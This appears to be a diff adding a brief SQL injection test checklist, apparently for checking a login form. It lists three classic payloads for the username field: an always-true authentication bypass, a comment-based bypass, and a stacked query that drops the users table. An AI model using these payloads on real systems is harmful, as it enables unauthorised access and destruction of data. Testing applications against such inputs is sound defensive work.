@@ -1,0 +1,16 @@
+SQL Injection Test
+
+Test 1: The "Always True" Bypass (The most famous attack)
+
+Query 1 --> admin' OR '1'='1 	--> Enter this query in username 
+
+Test 2: The Comment Attack
+
+Query 1 --> admin' --		--> -- double dash used to comment the code in sql
+
+Test 3: The Stacked Query Data Deletion (The dangerous one)
+
+Query 1 --> testuser'; DROP TABLE users; --   --> 
+
+After not getting an enterance hacker will try to destroy your databse by ending the query with semi-colon and passing a new query some like drop table.
+
